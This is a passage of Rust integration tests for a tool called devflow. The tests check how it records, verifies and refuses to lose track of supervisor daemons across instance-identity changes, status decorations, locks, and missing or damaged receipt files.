    assert_eq!(
        recorded_ids(&t, &ws),
        None,
        "the old record is not carried over"
    );
}

#[test]
fn a_new_instance_is_refused_when_the_old_daemons_cannot_be_shown_gone() {
    // Each case: the old identity may have daemons devflow cannot see.
    // (what, how the fake is arranged, whether pitchfork does not run at all,
    // the words of the reason)
    type Arrange = fn(&Fake, &str);
    let cases: [(&str, Arrange, bool, &str); 4] = [
        (
            "the listing cannot be read",
            |fake, _| fake.set("list_fail", "1"),
            false,
            "could not be asked",
        ),
        (
            "a daemon is in a state devflow does not know",
            |fake, ns| {
                fake.json(
                    "list.json",
                    &json!([listed(ns, "web", "paused", Some(4242), Some(3000))]),
                )
            },
            false,
            "does not recognise",
        ),
        (
            "the supervisor is down after devflow started daemons",
            |fake, _| fake.set("supervisor_down", "1"),
            false,
            "supervisor is down",
        ),
        (
            "pitchfork does not run, after devflow started daemons",
            |_, _| {},
            true,
            "does not run",
        ),
    ];
    for (name, arrange, broken, expect) in cases {
        let fake = Fake::new();
        let t = repo(Some(WEB), "");
        let ws = ready(&t, "feature", true);
        let old = instance_of(&t, &ws);
        let ns = started_by_devflow(&t, &fake, &ws);
        arrange(&fake, &ns);
        fake.clear_calls();
        // (Detection is remembered per executable, so "does not run" is another one.)
        let none = Fake::new();
        none.set("version_exit", "1");
        let error = new_instance(&t, if broken { &none } else { &fake }, &ws).unwrap_err();
        let refused = refusal(&error);
        let Refusal::StateUnknown { detail, hint } = refused else {
            panic!("{name}: not state_unknown: {error:#}");
        };
        assert!(detail.contains(expect), "{name}: {detail}");
        assert!(
            hint.as_deref()
                .is_some_and(|hint| hint.contains("stop the workspace's processes")
                    && hint.contains("DEVFLOW_INSTANCE_ID")),
            "{name}: {hint:?}"
        );
        assert_eq!(instance_of(&t, &ws), old, "{name}");
        assert_eq!(
            recorded_ids(&t, &ws),
            Some(vec![format!("{ns}/web")]),
            "{name}"
        );
        assert!(fake.mutations().is_empty(), "{name}: {:?}", fake.calls());
    }
}

#[test]
fn a_new_instance_goes_ahead_when_nothing_of_the_old_identity_can_run() {
    // The way out of a copy made with `--new-instance`: an up supervisor whose
    // listing shows nothing active verifies that nothing runs, record or not.
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let old = instance_of(&t, &ws);
    let ns = started_by_devflow(&t, &fake, &ws);
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    new_instance(&t, &fake, &ws).unwrap();
    assert_ne!(instance_of(&t, &ws), old);

    // A supervisor that is down, with no start devflow recorded, proceeds (the
    // same exception as a removal's); so does a project with no pitchfork at all.
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let old = instance_of(&t, &ws);
    fake.set("supervisor_down", "1");
    new_instance(&t, &fake, &ws).unwrap();
    assert_ne!(instance_of(&t, &ws), old);
    let plain = repo(None, "");
    let ws = ready(&plain, "feature", true);
    let old = instance_of(&plain, &ws);
    let broken = Fake::new();
    broken.set("version_exit", "1");
    new_instance(&plain, &broken, &ws).unwrap();
    assert_ne!(instance_of(&plain, &ws), old);
    assert!(
        broken.calls().is_empty(),
        "no pitchfork file: nothing to ask"
    );
}

#[test]
fn a_receipt_copied_from_another_machine_is_replaced_by_devflow_instance_id() {
    const NAME: &str = "a_receipt_copied_from_another_machine_is_replaced_by_devflow_instance_id";
    let named = "6f1d3a1e-7a53-4c83-9a2f-0f1a2b3c4d5e";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", named)]) {
        return;
    }
    let named: uuid::Uuid = named.parse().unwrap();
    // The copy carries the record of daemons that ran on the other machine; on
    // this one the supervisor is down, or pitchfork is not even installed.
    for (what, arrange, broken) in [
        ("a supervisor that is down", ("supervisor_down", "1"), false),
        ("a pitchfork that does not run", ("", ""), true),
        ("a listing that cannot be read", ("list_fail", "1"), false),
    ] {
        let fake = Fake::new();
        let t = repo(Some(WEB), "");
        let ws = ready(&t, "vm", true);
        let ns = started_by_devflow(&t, &fake, &ws);
        if !arrange.0.is_empty() {
            fake.set(arrange.0, arrange.1);
        }
        fake.clear_calls();
        let none = Fake::new();
        none.set("version_exit", "1");
        // The override is honoured by the explicit setup, with or without the flag.
        setup::setup(
            &t.project,
            &ws,
            SetupOptions {
                pitchfork: Some(if broken {
                    none.pitchfork()
                } else {
                    fake.pitchfork()
                }),
                ..SetupOptions::default()
            },
            false,
            false,
            &mut NoProgress,
        )
        .unwrap_or_else(|e| panic!("{what}: {e:#}"));
        assert_eq!(instance_of(&t, &ws), named, "{what}");
        assert_ne!(namespace_of(&t, &ws), ns, "{what}");
        assert_eq!(recorded_ids(&t, &ws), None, "{what}");
    }
    // What this machine's own pitchfork lists as active in the old namespace is
    // observed, not recorded, so it still blocks.
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "vm", true);
    let old = instance_of(&t, &ws);
    let ns = started_by_devflow(&t, &fake, &ws);
    let error = setup::setup(
        &t.project,
        &ws,
        SetupOptions {
            pitchfork: Some(fake.pitchfork()),
            ..SetupOptions::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::DaemonsRunning { ids } if ids == &[format!("{ns}/web")]),
        "{error:#}"
    );
    assert_eq!(instance_of(&t, &ws), old);
}

#[test]
fn a_replacement_that_finds_the_receipt_changed_takes_the_process_lock_before_it_looks() {
    // setup sees identity A (its DEVFLOW_INSTANCE_ID names it, so nothing is
    // replaced yet); another setup replaces it with B; an `up` records B's
    // start intent and holds the process lock while it launches. The first
    // setup now finds a fork under the receipt lock. It must not ask pitchfork
    // before it holds the process lock: that look would be of a moment before
    // the daemon appeared.
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let a = instance_of(&t, &ws);
    fake.clear_calls();
    let mut up = None;
    let mut interleave = || {
        let mut receipt = Receipt::load(&ws.git_dir).unwrap().unwrap();
        receipt.instance_id = uuid::Uuid::new_v4();
        receipt.save(&ws.git_dir).unwrap();
        up = Some(processes::process_lock(&ws).unwrap());
    };
    let error = setup::setup_interleaved(
        &t.project,
        &ws,
        SetupOptions {
            pitchfork: Some(fake.pitchfork()),
            ..SetupOptions::default()
        },
        (false, false),
        Some(a),
        &mut interleave,
        &mut NoProgress,
    )
    .unwrap_err();
    let busy = error.downcast_ref::<devflow_core::error::Busy>();
    assert!(
        busy.is_some_and(|busy| busy.with == devflow_core::error::BusyWith::Processes),
        "not Busy on the processes: {error:#}"
    );
    assert!(
        fake.calls().is_empty(),
        "pitchfork was asked before the lock was held: {:?}",
        fake.calls()
    );
    let b = instance_of(&t, &ws);
    assert_ne!(b, a, "B's receipt was not replaced");

    // The `up` finishes: B's daemon runs. Looked at under both locks, a
    // second attempt sees it and refuses; nothing is replaced.
    drop(up);
    let ns = started_by_devflow(&t, &fake, &ws);
    fake.clear_calls();
    let error = setup::setup_interleaved(
        &t.project,
        &ws,
        SetupOptions {
            pitchfork: Some(fake.pitchfork()),
            ..SetupOptions::default()
        },
        (false, false),
        Some(a),
        &mut || {},
        &mut NoProgress,
    )
    .unwrap_err();
    // The identity A is not B's, so this is a copy declared by the variable;
    // what pitchfork lists as active in B's namespace still blocks.
    assert!(
        matches!(refusal(&error), Refusal::DaemonsRunning { ids } if ids == &[format!("{ns}/web")]),
        "{error:#}"
    );
    assert_eq!(instance_of(&t, &ws), b);
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
}

// --- decorated states -------------------------------------------------------------
//
// pitchfork may append to a status: `running (ready)`, `failed: exit 3`. One
// classifier (`pitchfork::DaemonStatus`) reads them for the listing, the report,
// the observation and the app, so a listing the parser calls verifiable cannot be
// one the report calls inactive.

#[test]
fn decorated_states_mean_what_they_start_with_through_up_down_and_remove() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let web = |status: &str, pid: Option<u32>| listed(&ns, "web", status, pid, Some(3000));

    // up: `waiting (ready check)` after the start is alive, the report is ok,
    // and the status counts it.
    fake.json(
        "after_start.json",
        &json!([web("waiting (ready check)", Some(4242))]),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ok(), "{report:?}");
    assert!(report.daemons.iter().all(|d| d.is_active()), "{report:?}");
    // The listing is verifiable and the observation complete.
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert_eq!(
        status.daemons.iter().filter(|d| d.is_active()).count(),
        1,
        "{:?}",
        status.daemons
    );
    // A start that is already satisfied is recognised through the decoration too.
    fake.json("list.json", &json!([web("running (ready)", Some(4242))]));
    fake.clear_calls();
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ok(), "{report:?}");
    assert!(
        fake.mutations().is_empty(),
        "nothing to start: {:?}",
        fake.calls()
    );
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("already running")),
        "{:?}",
        report.warnings
    );

    // down: a decorated running daemon is stopped, and a stop is not ok while
    // the listing afterwards still shows one alive, however it is decorated.
    for alive in [
        "running (ready)",
        "stopping (SIGTERM sent)",
        "Waiting: ready check",
    ] {
        fake.json("list.json", &json!([web("running (ready)", Some(4242))]));
        fake.json("after_stop.json", &json!([web(alive, Some(4242))]));
        fake.clear_calls();
        let report = down(&t, &fake, &ws, false).unwrap();
        assert_eq!(fake.mutations(), [format!("stop {ns}/web")], "{alive}");
        assert!(
            !report.ok(),
            "{alive}: a stop over a live daemon is not ok: {report:?}"
        );
        assert!(recorded_ids(&t, &ws).is_some(), "{alive}: the record stays");
    }
    // ...and it is ok once the listing shows it gone, decorated or not.
    for gone in [
        "stopped (SIGTERM)",
        "failed: exit 3",
        "errored (exit 3)",
        "available",
    ] {
        fake.json("list.json", &json!([web("running (ready)", Some(4242))]));
        fake.json("after_stop.json", &json!([web(gone, None)]));
        let report = down(&t, &fake, &ws, false).unwrap();
        assert!(report.ok(), "{gone}: {report:?}");
        assert_eq!(
            recorded_ids(&t, &ws),
            None,
            "{gone}: a verified stop clears the record"
        );
        // The next case needs a recorded start again.
        fake.json(
            "after_start.json",
            &json!([web("running (ready)", Some(4242))]),
        );
        fake.json("list.json", &json!([]));
        let _ = start(&t, &fake, &ws).unwrap();
    }

    // A daemon that failed after a start is a failed start, decorated or not.
    for failed in ["failed: exit 3", "errored (exit 3)", "Failed"] {
        fake.json("after_start.json", &json!([web(failed, None)]));
        fake.json("list.json", &json!([]));
        let report = start(&t, &fake, &ws).unwrap();
        assert!(!report.ok(), "{failed}: {report:?}");
        assert!(
            report.daemons.iter().any(|d| d.failed()),
            "{failed}: {report:?}"
        );
    }
}

#[test]
fn removal_sees_a_decorated_running_daemon_and_needs_it_stopped() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let web = |status: &str, pid: Option<u32>| listed(&ns, "web", status, pid, Some(3000));
    fake.json("list.json", &json!([web("running (ready)", Some(4242))]));

    // The plan finds it, whatever the decoration says.
    let plan = processes::plan_removal(Some(&fake.pitchfork()), &t.project, &ws, false)
        .unwrap()
        .expect("a running daemon to stop");
    assert_eq!(plan.daemons(), [format!("{ns}/web")]);

    // A stop that leaves it alive blocks the removal (it saw no stop)…
    fake.json(
        "after_stop.json",
        &json!([web("running (ready)", Some(4242))]),
    );
    let error = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("still running"), "{error:#}");
    assert!(ws.path.exists());

    // …and one that really stops it lets the removal through.
    fake.json("after_stop.json", &json!([web("stopped (SIGTERM)", None)]));
    let out = setup::remove(
        &t.project,
        "feature",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(out.stopped_daemons, [format!("{ns}/web")]);
    assert!(!ws.path.exists());
}

// --- an observation that cannot attribute is not complete ------------------------
//
// `status` shows a daemon as the workspace's only through the namespace devflow
// assigned (the receipt's) and only while the files say the same. When it cannot
// attribute, every listed daemon is filtered out of the view; that is not an
// observation of "nothing runs".

#[test]
fn a_deleted_namespace_file_makes_the_observation_incomplete_when_daemons_may_run() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let observation = || processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    // Nothing started, nothing listed: an empty view is complete, file or not.
    std::fs::remove_file(ws.path.join(processes::LOCAL_FILE)).unwrap();
    let status = observation();
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    // Put devflow's file back for the start.
    processes::ensure_namespace(
        &t.project,
        &ws,
        &setup::receipt(&t.project, &ws).unwrap().unwrap(),
    );
    assert!(ws.path.join(processes::LOCAL_FILE).exists());
    let _ = started_by_devflow(&t, &fake, &ws);
    let status = observation();
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.daemons.iter().any(|d| d.is_active()));

    // The file is deleted while the daemon runs: it is listed under the assigned
    // namespace, the view shows no daemon of the workspace, and says why.
    std::fs::remove_file(ws.path.join(processes::LOCAL_FILE)).unwrap();
    let status = observation();
    assert!(
        status.daemons.iter().all(|d| d.is_not_started()),
        "{:?}",
        status.daemons
    );
    assert!(
        !status.observation.is_complete(),
        "{:?}",
        status.observation
    );
    let why = status.observation.summary().unwrap();
    assert!(
        why.contains(&format!("{ns}/web")) && why.contains(processes::LOCAL_FILE),
        "{why}"
    );

    // The listing shows nothing, but the receipt records the start: still not
    // attributable, so not complete.
    fake.json("list.json", &json!([]));
    let status = observation();
    assert!(
        !status.observation.is_complete(),
        "{:?}",
        status.observation
    );
    let why = status.observation.summary().unwrap();
    assert!(
        why.contains("records a start") && why.contains(processes::LOCAL_FILE),
        "{why}"
    );

    // A start writes the file again (that is how the workspace is repaired),
    // and the view is an observation again.
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "running", Some(4343), Some(3000))]),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ok(), "{report:?}");
    let status = observation();
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.daemons.iter().any(|d| d.is_active()));
}

#[test]
fn a_receipt_that_cannot_be_read_makes_the_observation_incomplete() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(4242), Some(3000))]),
    );
    let observation = || processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    let status = observation();
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.daemons.iter().any(|d| d.is_active()));

    // The receipt is damaged: no namespace is assigned as far as devflow can
    // tell, every listed daemon is filtered out of the view, and the view says
    // that it could not look.
    let receipt = Receipt::path(&ws.git_dir);
    let good = std::fs::read_to_string(&receipt).unwrap();
    std::fs::write(&receipt, "{ not a receipt").unwrap();
    let status = observation();
    assert!(
        status.daemons.iter().all(|d| d.is_not_started()),
        "{:?}",
        status.daemons
    );
    assert!(
        !status.observation.is_complete(),
        "{:?}",
        status.observation
    );
    let why = status.observation.summary().unwrap();
    assert!(
        why.contains("receipt could not be read") && why.contains("cannot tell which"),
        "{why}"
    );
    // With the supervisor down as well there is still nothing to attribute by.
    fake.set("supervisor_down", "1");
    assert!(!observation().observation.is_complete());
    fake.unset("supervisor_down");

    // Restored, it is an observation again.
    std::fs::write(&receipt, good).unwrap();
    let status = observation();
    assert!(status.observation.is_complete(), "{:?}", status.observation);
    assert!(status.daemons.iter().any(|d| d.is_active()));

    // A workspace devflow never set up has no receipt at all, and started
    // nothing: that is complete.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &raw);
    assert!(status.observation.is_complete(), "{:?}", status.observation);
}
